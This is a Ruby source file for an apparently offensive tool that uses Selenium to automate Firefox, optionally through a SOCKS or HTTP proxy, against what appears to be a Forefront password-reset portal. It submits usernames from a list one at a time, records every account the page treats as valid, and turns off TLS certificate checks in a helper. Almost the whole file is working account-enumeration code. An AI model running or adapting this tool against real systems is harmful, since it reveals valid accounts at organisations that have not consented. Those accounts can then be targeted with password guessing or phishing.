begin
	require "selenium-webdriver"
rescue 
	puts "Selenium webdriver is not installed please install it: \"gem intall selenium-webdriver\""
end

require 'net/http'
require 'net/https'
require 'open-uri'
#require 'tesseract-ocr'

# Missing captchas implementation

class PWRESET_FF
	def initialize(host,path,file,result_file,proxy,http_proxy)
		begin
			@base_url = host 	
			@path = path
			
			#puts "\n\nEnumerating users on #{@base_url}"
			
			if proxy == ""
				profile = Selenium::WebDriver::Firefox::Profile.new
				if http_proxy == ""
					@driver = Selenium::WebDriver.for :firefox
				else
					# Firefox profile configure HTTP(S) proxy					
					proxy_info = http_proxy.split(":")
					profile['network.proxy.http'] = proxy_info[0].to_s
					profile['network.proxy.http_port'] = proxy_info[1].to_i
					profile['network.proxy.ssl'] = proxy_info[0].to_s
					profile['network.proxy.ssl_port'] = proxy_info[1].to_i
					profile['network.proxy.type'] = 1
					@driver = Selenium::WebDriver.for :firefox, :profile => profile
				end
			else
				# Firefox profile configure socks proxy
				profile = Selenium::WebDriver::Firefox::Profile.new
				
				proxy_info = proxy.split(":")
				profile['network.proxy.socks'] = proxy_info[0].to_s
				profile['network.proxy.socks_port'] = proxy_info[1].to_i
				profile['network.proxy.type'] = 1

				@driver = Selenium::WebDriver.for :firefox, :profile => profile
			end
			
			@accept_next_alert = true
			@driver.manage.timeouts.implicit_wait = 30
			
			@verification_errors = []
			
			# Provide a file with a list of users 
			@file= file
			
			# Provide a result file where the users will be stored
			@result_file = result_file
			
			
		rescue Exception => e  
  			puts e.message + "in intiliaze module QPM"
		end
	end
	
	
	
	def redirect(location)
		uri = URI.parse(location)
		http = Net::HTTP.new(uri.host, uri.port)
		http.use_ssl = true
		http.verify_mode = OpenSSL::SSL::VERIFY_NONE
		request = Net::HTTP::Get.new(uri.request_uri)
		response = http.request(request)
		
		if response.code == "200"
			return true
		else
			puts "Got response code: #{response.code}"
			return false
		end
	end
	
		
	
	def write_uniq(array_users)		
		file = File.new(@result_file,"w+")
		array_users.each do |user|
			file.puts user
		end
		file.close
	end
	
	
	
	def brute_user
		# Brute forcing user accounts based on file
		begin
			usr = File.new(@file.to_s,'r+')
			@driver.get(@base_url + @path)
			
				
			
			results = File.new(@result_file.to_s,'w') 
			results.close
			
			usr.each do |user|
				
				@driver.manage.delete_all_cookies
				@driver.get(@base_url + @path)
				
				user = user.delete("\n")
				
				results = File.new(@result_file.to_s,'a+') 
				
				
				puts "Testing User:#{user}"
				
				if element_present?(:id, "ctl00_ContentPlaceholderMain_DomainUserName")
					@driver.find_element(:id, "ctl00_ContentPlaceholderMain_DomainUserName").clear
					@driver.find_element(:id, "ctl00_ContentPlaceholderMain_DomainUserName").send_keys "#{user}"
					@driver.find_element(:id, "ctl00_ContentPlaceholderMain_LogOnButton").click
				end
							
				#@driver.find_element(:id, "ctl00_ContentPlaceholderMain_ErrorDisplayControl_ConfigurablePortalLink").click
				
				
				if element_present?(:id, "ctl00_ContentPlaceholderMain_ErrorDisplayControl_ConfigurablePortalLink") 
					puts "user NOT found"				
				else
					puts "Valid User Account #{user}"
					results.puts user
				end
				
				results.close
			end
			
			usr.close
			
			@driver.quit
			
		rescue Exception => e 
			puts "Exception"
  			if element_present?(:id, "ctl00_Cancel") 
					puts "Valid User Account #{user}"
					results.puts user			
			end
			
			puts e.message + "==> brute_user module pwreset forefront"
			@driver.quit
		end			
	end
	
	
	
	def read_file
		f = File.new(@file,'r+')
		f.each do |line|
			puts line
		end
		f.close
	end
	
	
	def element_present?(how, what)
	    @driver.find_element(how, what)
	    return true
	rescue Exception => e 
		puts e.message + "==> brute_user module pwreset forefront"
		return false
	 end
  
	def alert_present?()
		@driver.switch_to.alert
		true
		rescue Selenium::WebDriver::Error::NoAlertPresentError
		false
	 end
  

  
	def verify(&blk)
		yield
	rescue ExpectationNotMetError => ex
		@verification_errors << ex
	end
  
	def close_alert_and_get_its_text(how, what)
		alert = @driver.switch_to().alert()
		if (@accept_next_alert) then
			alert.accept()
		else
			alert.dismiss()
		end
			alert.text
		ensure
			@accept_next_alert = true
	end
end

 